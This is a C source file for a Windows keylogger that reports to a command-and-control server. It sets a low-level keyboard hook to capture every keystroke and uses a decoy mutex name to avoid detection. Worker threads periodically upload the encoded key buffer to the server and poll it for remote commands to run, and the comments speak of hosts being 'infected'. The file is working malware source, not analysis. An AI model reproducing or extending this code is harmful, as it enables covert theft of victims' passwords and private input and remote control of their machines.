
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

#include "program.h"
#include "../client/commands.h"

// prototypes for private functions
static PROGRAM_CONTEXT* initProgramContext();
static ERR_CODE runKeyLogger();
static void doShutdown();

DWORD WINAPI writeLogThread(LPVOID lpParam);
DWORD WINAPI pollCmdsAndBeaconThread(LPVOID lpParam);
LRESULT CALLBACK lowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);


PROGRAM_CONTEXT* ctx;


/**
 * Sets up the primary components of the program.
 * Begins by initialising the program context global variable (1),
 * it then registers the client with the C2 server (2) followed by 
 * creating a mutex that will be utilised for safe threading (3).
 * Lastly checks if the mutex already exists, if so this host is 
 * already infected! (4) 
 */
ERR_CODE setup() {
    ctx = initProgramContext(); // 1
    if (ctx == NULL) { return ECODE_NULL; }

    ERR_CODE ret = registerClient(ctx->client, &ctx->__KEY__); // 2
    if (ret != ECODE_SUCCESS) { return ret; }
    
    // set the key loggers encoding key
    ctx->kLogger->encKey = ctx->__KEY__;

    // 3 create threading mutex with a somewhat believeable name :)
    ctx->hMutexThreadSync = CreateMutexA(NULL, FALSE, "wint_hObj23:10");
    if (ctx->hMutexThreadSync == NULL)  { return ECODE_NULL; } 
    if (GetLastError() == ERROR_ALREADY_EXISTS) { return ECODE_SAFE_RET; } // 4 

    printf("\nPROGRAM_CONTEXT initialised...\n\n");
    return ECODE_SUCCESS;
}


/**
 * initialises a new program context which will how handles to the worker threads 
 * as well as the mutex
 */
static PROGRAM_CONTEXT* initProgramContext() {
    PROGRAM_CONTEXT* prCon = malloc(sizeof(PROGRAM_CONTEXT));
    if (prCon == NULL) { return NULL; }

    // create client structure
    prCon->client = initClient();
    if (prCon->client == NULL) {
        free(prCon);
        return NULL;
    }
    // create key logger structure
    prCon->kLogger = initKeyLogger();
    if (prCon->kLogger == NULL) {
        free(prCon->client);
        free(prCon);
        return NULL;
    }
    // install the LowLevelKeyboardProc and set the hook
    prCon->hLowLevelKeyHook = SetWindowsHookExA(WH_KEYBOARD_LL, lowLevelKeyboardProc, NULL, 0);
    if (prCon->hLowLevelKeyHook == NULL) {
        programContextCleanup(prCon);
        return NULL;
    }

    prCon->mainThreadId = GetCurrentThreadId();
    prCon->hCmdThread = NULL;
    prCon->hWriteThread = NULL;
    prCon->hMutexThreadSync = NULL;
    prCon->shutdown = FALSE;
    prCon->sleeping = FALSE;
    return prCon;
}


// ----------------------
// --- thread section ---
// ----------------------

ERR_CODE startThreads() {
    // create the worker threads
    HANDLE hWriteThr = CreateThread(NULL, 0, writeLogThread, NULL, 0, NULL);
    HANDLE hCmdThr = CreateThread(NULL, 0, pollCmdsAndBeaconThread, NULL, 0, NULL);

    // update the program context
    ctx->hWriteThread = hWriteThr;
    ctx->hCmdThread = hCmdThr;
    if (ctx->hCmdThread == NULL || ctx->hWriteThread == NULL) {
        return ECODE_NULL;
    }
    
    ERR_CODE ret = runKeyLogger();

    // wait for both threads to finish
    HANDLE threads[2] = { ctx->hWriteThread, ctx->hCmdThread };
    WaitForMultipleObjects(2, threads, TRUE, INFINITE);

    printf("Threads complete!\n");
    return ret;
}

/**
 * Function that executes infinitely until shd command is given. 
 * Every 20 seconds it attempts to write the captured keys to the 
 * server logs, if th write fails then it tries two more times.
 * Then resets the kLogger
 * 
 * Important note: if the key buffer is empty, then don't 
 * do anything to limit network activity.
 */
DWORD WINAPI writeLogThread(LPVOID lpParam) {
    while (!ctx->shutdown) {
        Sleep(SLP_WRITER_THREAD);
        WaitForSingleObject(ctx->hMutexThreadSync, INFINITE);
        printf("Writing...\n");
        
        // skip the write if the buffer is empty
        if (ctx->kLogger->bufferPtr == 0) { goto skipWrite; }

        // tries the to write the key buffer at max 3 times
        int ret = ECODE_POST;
        for (int i = 1; i < 3 && ret == ECODE_POST; i++) {
            ret = writeKeyLog(ctx->client, ctx->kLogger);
        }
        if (ret != ECODE_SUCCESS) { printErr(ret); }

        resetKLBufferAndKey(ctx->kLogger, ctx->__KEY__);

        skipWrite:
        ReleaseMutex(ctx->hMutexThreadSync);
    }
    return 0;
}

/**
 * function that executes infinitely until `shd` command is given. 
 * Each iteration it retrieves the remote commands and then executes them!
 */
DWORD WINAPI pollCmdsAndBeaconThread(LPVOID lpParam) {
    while (!ctx->shutdown) {
        Sleep(SLP_CMD_THREAD);
        WaitForSingleObject(ctx->hMutexThreadSync, INFINITE);

        ERR_CODE ret = pollCommandsAndBeacon(ctx->client); printf("Polling...\n");

        // only execute the commands if there is something to exec. or an err was not found
        if (ret != ECODE_SUCCESS) {
            printErr(ret); 
            goto skipCmds;
        }
        
        ret = processCommands(ctx->client);
        if (ret == ECODE_DO_SHUTDOWN) { doShutdown(); }
        if (ret != ECODE_SUCCESS)     { printErr(ret); }
        
        skipCmds:
        ReleaseMutex(ctx->hMutexThreadSync);
    }
    return 0;
}

// System.out.println("Hello world! :)");

/**
 * key logger loop that runs on the main thread!
 * This method simply calls the blocking method GetMessageA, this waits for 
 * a message to be posted to this thread. As such, the keylogger terminates 
 * when the shutdown command is sent, which envokes the doShutdown method
 * which posts a message to the main thread!
 * Resources: https://stackoverflow.com/questions/73340668/how-to-process-key-down-state-on-lowlevelkeyboardproc-with-wh-keyboard
 */
static ERR_CODE runKeyLogger() {
    MSG msg;
    while (!ctx->shutdown && GetMessageA(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageA(&msg);
    }
    return ECODE_SUCCESS;
}

/**
 * Call back function evoked on every key press, as set by the SetWindowsHookExA 
 * function. Creating this function was also based on the previous functions resource
 */
LRESULT CALLBACK lowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (ctx->sleeping) {  // skip if the program is "sleeping"
        return CallNextHookEx(ctx->hLowLevelKeyHook, nCode, wParam, lParam);
    }
    KBDLLHOOKSTRUCT *keyPress = (KBDLLHOOKSTRUCT *)lParam;
    DWORD vkCode = keyPress->vkCode;

    // skip key presses that update ke logger state, and key up events
    BOOL wasUpdated = updateKeyLoggerState(ctx->kLogger, wParam, &vkCode);
    if (wasUpdated || wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
        return CallNextHookEx(ctx->hLowLevelKeyHook, nCode, wParam, lParam);
    }
    
    ERR_CODE ret = addKeyPressToBuffer(ctx->kLogger, &vkCode);
    if (ret == ECODE_FULL_BUFF) {
        // do something?
    }
    printf("%s\n", ctx->kLogger->keyBuffer);
    return CallNextHookEx(ctx->hLowLevelKeyHook, nCode, wParam, lParam);
}



static void doShutdown() {
    ctx->shutdown = TRUE;  // set the shutdown flag
    // post a message to the main thread, this will cause it to stop!
    PostThreadMessageA(ctx->mainThreadId, WM_QUIT, 0, 0);
}



// ---------------
// --- Cleanup ---
// ---------------

void programCleanup() {
    programContextCleanup(ctx);
}

/**
 * cleanup function to close each of the handles and free allocated memory
 */
void programContextCleanup(PROGRAM_CONTEXT* prCon) {
    if (prCon == NULL) return;

    // free the client
    if (prCon->client != NULL) { clientCleanup(prCon->client); }
    // free the keylogger
    if (prCon->kLogger != NULL) { keyLoggerCleanup(prCon->kLogger); }
    
    //unhook keyboard events
    if (prCon->hLowLevelKeyHook != NULL) {
        UnhookWindowsHookEx(prCon->hLowLevelKeyHook);
    }

    // close thread handles
    if (prCon->hCmdThread != NULL) { CloseHandle(prCon->hCmdThread); }
    if (prCon->hWriteThread != NULL) { CloseHandle(prCon->hWriteThread); }

    // close mutex handle
    if (prCon->hMutexThreadSync != NULL) { CloseHandle(prCon->hMutexThreadSync); }
    
    free(prCon);
}


